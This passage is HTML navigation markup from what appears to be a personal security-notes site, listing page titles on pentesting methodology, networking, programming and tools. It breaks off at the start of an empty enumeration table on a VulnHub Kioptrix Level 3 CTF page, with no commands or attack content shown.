+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/" title="NFS" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/">
+        NFS
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/" title="searchsploit" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/">
+        searchsploit
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/" title="smb" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/">
+        smb
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/" title="smtp" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/">
+        smtp
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/" title="Web" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/">
+        Web
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/" title="03. Exploitation" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/03-exploitation/">
+          03. Exploitation
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/" title="Active Directory" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/">
+          Active Directory
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/" title="Attack Tools" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/">
+          Attack Tools
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/" title="mitm6" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/">
+        mitm6
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/" title="ntlmrelayx" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/">
+        ntlmrelayx
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/" title="psexec" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/">
+        psexec
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/" title="responder" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/">
+        responder
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/" title="IPv6 DNS Takeover" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/">
+        IPv6 DNS Takeover
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/" title="LLMNR and NBT-NS" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/">
+        LLMNR and NBT-NS
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/" title="SMB Relay" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/">
+        SMB Relay
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/" title="WPAD" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/">
+        WPAD
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/password-attacks/credential-stuffing/" title="Credential Stuffing" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/password-attacks/credential-stuffing/">
+        Credential Stuffing
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/password-attacks/brute-force/" title="Hydra" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/password-attacks/brute-force/">
+        Hydra
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/password-attacks/password-spraying/" title="Password Spraying" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/password-attacks/password-spraying/">
+        Password Spraying
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/redis/" title="Redis" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/redis/">
+        Redis
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/s3-bucket-fun/" title="s3 bucket fun" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/s3-bucket-fun/">
+        s3 bucket fun
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/shells/" title="Shells" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/03-exploitation/shells/">
+          Shells
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/" title="msfvenom" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/">
+        msfvenom
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/shells/payloads/" title="payloads" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/shells/payloads/">
+        payloads
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/sql-injection/" title="SQL Injection" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/sql-injection/">
+        SQL Injection
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/03-exploitation/web-servers/" title="Web Servers" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/03-exploitation/web-servers/">
+        Web Servers
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/" title="04. Post Exploitation" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/04-post-exploitation/">
+          04. Post Exploitation
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/active-directory/" title="activedirectory" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/04-post-exploitation/active-directory/">
+          activedirectory
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/" title="credentialaccess" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/">
+        credentialaccess
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/" title="powerview" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/">
+        powerview
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/" title="encrypted password protected pdf" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/">
+        encrypted password protected pdf
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/" title="encrypted password protected zip" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/">
+        encrypted password protected zip
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/" title="hash identifier" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/">
+        hash identifier
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/" title="hashcat" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/">
+        hashcat
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/post-compermise-recon/" title="post compromise recon" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/post-compermise-recon/">
+        post compromise recon
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/" title="priv esc" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/">
+        priv esc
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/" title="shell escaping" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/">
+        shell escaping
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/steal-access-tokens/" title="steal access tokens" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/steal-access-tokens/">
+        steal access tokens
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/" title="unshadow" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/">
+        unshadow
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/" title="wpadmin plugin upload" class="dd-item ">
+        <a href="/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/">
+        wpadmin plugin upload
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/todo-hacking-methodology/05-cleanup/" title="05. Cleanup" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/todo-hacking-methodology/05-cleanup/">
+          05. Cleanup
+          
+      </a>
+      
+              
+    </li>
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/networking/" title="Networking" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/networking/">
+          <i class='fas fa-network-wired'></i> Networking
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+             
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/networking/osi-model/" title="OSI Model" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/networking/osi-model/">
+          <i class='fas fa-ethernet'></i> OSI Model
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/networking/osi-model/layer1/" title="Layer 1" class="dd-item ">
+        <a href="/notes/networking/osi-model/layer1/">
+        <i class='fas fa-ethernet'></i> Layer 1
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/networking/osi-model/layer2/" title="Layer 2" class="dd-item ">
+        <a href="/notes/networking/osi-model/layer2/">
+        <i class='fas fa-ethernet'></i> Layer 2
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/networking/osi-model/layer3/" title="Layer 3" class="dd-item ">
+        <a href="/notes/networking/osi-model/layer3/">
+        <i class='fas fa-ethernet'></i> Layer 3
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/networking/osi-model/layer4/" title="Layer 4" class="dd-item ">
+        <a href="/notes/networking/osi-model/layer4/">
+        <i class='fas fa-ethernet'></i> Layer 4
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/networking/osi-model/layer5/" title="Layer 5" class="dd-item ">
+        <a href="/notes/networking/osi-model/layer5/">
+        <i class='fas fa-ethernet'></i> Layer 5
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/networking/osi-model/layer6/" title="Layer 6" class="dd-item ">
+        <a href="/notes/networking/osi-model/layer6/">
+        <i class='fas fa-ethernet'></i> Layer 6
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/networking/osi-model/layer7/" title="Layer 7" class="dd-item ">
+        <a href="/notes/networking/osi-model/layer7/">
+        <i class='fas fa-ethernet'></i> Layer 7
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+             
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/networking/tcpip-model/" title="TCP/IP Model" class="dd-item ">
+        <a href="/notes/networking/tcpip-model/">
+        <i class='fas fa-ethernet'></i> TCP/IP Model
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/programming/" title="Programming" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/programming/">
+          <i class='fas fa-code'></i> Programming
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/programming/bash/" title="Bash" class="dd-item ">
+        <a href="/notes/programming/bash/">
+        <i class='fas fa-layer-group'></i> Bash
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/programming/docker-compose/" title="Docker-Compose" class="dd-item ">
+        <a href="/notes/programming/docker-compose/">
+        <i class='fas fa-layer-group'></i> Docker-Compose
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/programming/dockerfile/" title="Dockerfile" class="dd-item ">
+        <a href="/notes/programming/dockerfile/">
+        <i class='fas fa-layer-group'></i> Dockerfile
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/programming/markdown/" title="Markdown" class="dd-item ">
+        <a href="/notes/programming/markdown/">
+        <i class='fas fa-layer-group'></i> Markdown
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/programming/mysql/" title="MySQL" class="dd-item ">
+        <a href="/notes/programming/mysql/">
+        <i class='fas fa-layer-group'></i> MySQL
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+             
+            
+          
+             
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/notes/programming/python/" title="Python" class="dd-item ">
+        <a href="/notes/programming/python/">
+        <i class='fas fa-layer-group'></i> Python
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/notes/z_private/" title="Z_Private" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/notes/z_private/">
+          <i class='fas fa-lock'></i>  Private
+          
+      </a>
+      
+              
+    </li>
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+          
+          
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/tools/" title="Tools" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/tools/">
+          <i class='fas fa-tools'></i> Tools
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+            
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/tools/00-c2-frameworks/" title="&#39;C2 Frameworks&#39;" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/tools/00-c2-frameworks/">
+          <i class='fas fa-folder'></i> C2 Frameworks
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/00-c2-frameworks/empire/" title="empire" class="dd-item ">
+        <a href="/tools/00-c2-frameworks/empire/">
+        <i class='fas fa-wrench'></i> empire
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/00-c2-frameworks/metasploit/" title="metasploit" class="dd-item ">
+        <a href="/tools/00-c2-frameworks/metasploit/">
+        <i class='fas fa-wrench'></i> metasploit
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/tools/00-forensic/" title="&#39;Forensic&#39;" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/tools/00-forensic/">
+          <i class='fas fa-folder'></i> Forensic
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/00-forensic/exiftool/" title="exiftool" class="dd-item ">
+        <a href="/tools/00-forensic/exiftool/">
+        <i class='fas fa-wrench'></i> exiftool
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/00-forensic/ssh-sha256-to-public-key/" title="ssh sha256 to public key" class="dd-item ">
+        <a href="/tools/00-forensic/ssh-sha256-to-public-key/">
+        <i class='fas fa-wrench'></i> ssh sha256 to public key
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/00-forensic/usbrip/" title="usbrip" class="dd-item ">
+        <a href="/tools/00-forensic/usbrip/">
+        <i class='fas fa-wrench'></i> usbrip
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/tools/00-steganography/" title="&#39;Steganography&#39;" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/tools/00-steganography/">
+          <i class='fas fa-folder'></i> Steganography
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/00-steganography/binwalk/" title="binwalk" class="dd-item ">
+        <a href="/tools/00-steganography/binwalk/">
+        <i class='fas fa-wrench'></i> binwalk
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/00-steganography/foremost/" title="foremost" class="dd-item ">
+        <a href="/tools/00-steganography/foremost/">
+        <i class='fas fa-wrench'></i> foremost
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/00-steganography/steghide/" title="steghide" class="dd-item ">
+        <a href="/tools/00-steganography/steghide/">
+        <i class='fas fa-wrench'></i> steghide
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/amass/" title="amass" class="dd-item ">
+        <a href="/tools/amass/">
+        <i class='fas fa-wrench'></i> amass
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/h8mail/" title="h8mail" class="dd-item ">
+        <a href="/tools/h8mail/">
+        <i class='fas fa-wrench'></i> h8mail
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/nc/" title="nc" class="dd-item ">
+        <a href="/tools/nc/">
+        <i class='fas fa-wrench'></i> nc
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/nmap/" title="Nmap" class="dd-item ">
+        <a href="/tools/nmap/">
+        <i class='fas fa-wrench'></i> Nmap
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+    <li data-nav-id="/tools/openssl/" title="openssl" class="dd-item 
+        
+        
+        
+        ">
+      <a href="/tools/openssl/">
+          <i class='fas fa-wrench'></i> openssl
+          
+      </a>
+      
+      
+        <ul>
+          
+          
+          
+          
+          
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/openssl/s_client/" title="s_client" class="dd-item ">
+        <a href="/tools/openssl/s_client/">
+        <i class='fas fa-wrench'></i> s_client
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/psdnsdumpsterapi/" title="PSDNSDumpsterAPI" class="dd-item ">
+        <a href="/tools/psdnsdumpsterapi/">
+        <i class='fas fa-wrench'></i> PSDNSDumpsterAPI
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/sublist3r/" title="sublist3r" class="dd-item ">
+        <a href="/tools/sublist3r/">
+        <i class='fas fa-wrench'></i> sublist3r
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/theharvester/" title="theHarvester" class="dd-item ">
+        <a href="/tools/theharvester/">
+        <i class='fas fa-wrench'></i> theHarvester
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+            
+            
+
+
+
+
+ 
+  
+    
+      <li data-nav-id="/tools/whatweb/" title="whatweb" class="dd-item ">
+        <a href="/tools/whatweb/">
+        <i class='fas fa-wrench'></i> whatweb
+        
+        </a>
+    </li>
+     
+  
+ 
+
+            
+          
+        
+        </ul>
+              
+    </li>
+  
+ 
+
+          
+         
+    </ul>
+
+    
+    
+      <section id="shortcuts">
+        <h3>More</h3>
+        <ul>
+          
+              <li> 
+                  <a class="padding" href="https://github.com/justin-p/"><i class='fab fa-github'></i> Github</a>
+              </li>
+          
+              <li> 
+                  <a class="padding" href="https://justin-p.me/"><i class='fas fa-kiss-wink-heart'></i> Blog</a>
+              </li>
+          
+              <li> 
+                  <a class="padding" href="https://twitter.com/JustinPerdok"><i class='fab fa-twitter'></i> Twitter</a>
+              </li>
+          
+              <li> 
+                  <a class="padding" href="https://www.linkedin.com/in/justinperdok/"><i class='fab fa-linkedin-in'></i> LinkedIn</a>
+              </li>
+          
+        </ul>
+      </section>
+    
+
+    
+    <section id="footer">
+      <p>
+  Built with 
+    <a href="https://github.com/matcornic/hugo-theme-learn"> 
+        Hugo Learn
+    </a>
+    and 
+    <a href="https://gohugo.io/">
+        Hugo
+    </a>
+</p>
+
+    </section>
+  </div>
+</nav>
+
+
+
+
+        <section id="body">
+        <div id="overlay"></div>
+        <div class="padding highlightable">
+              
+              <div>
+                <div id="top-bar">
+                
+                
+                <div id="breadcrumbs" itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb">
+                    <span id="sidebar-toggle-span">
+                        <a href="#" id="sidebar-toggle" data-sidebar-toggle="">
+                          <i class="fas fa-bars"></i>
+                        </a>
+                    </span>
+                  
+                  <span id="toc-menu"><i class="fas fa-list-alt"></i></span>
+                  
+                  <span class="links">
+                 
+                 
+                    
+          
+          
+            
+            
+          
+          
+            
+            
+          
+          
+            
+            
+          
+          
+            
+            
+          
+          
+            
+            
+          
+          
+            <a href='/'></a> > <a href='/notes/'>Notes</a> > <a href='/notes/ctfs/'>CTFs</a> > <a href='/notes/ctfs/vulnhub/'>VulnHub</a> > <a href='/notes/ctfs/vulnhub/kioptrix/'>Kioptrix</a> > Level 3
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+                 
+                  </span>
+                </div>
+                
+                    <div class="progress">
+    <div class="wrapper">
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#level3">level3</a>
+      <ul>
+        <li><a href="#enum">Enum</a></li>
+        <li><a href="#exploit">exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+                
+              </div>
+            </div>
+            
+        <div id="head-tags">
+        
+<div class="tags">
+
+  <a class="tag-link" href="/tags/vulnhub">VulnHub</a>
+
+</div>
+
+        </div>
+        
+        <div id="body-inner">
+        
+
+
+
+<h2 id="level3">level3</h2>
+<table>
+<thead>
+<tr>
+<th>Proto</th>
+<th>port</th>
+<th>Service/URL</th>
+<th>Info</th>
+<th>Potential Vulns</th>
+<th>Verified Vulns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td>system</td>
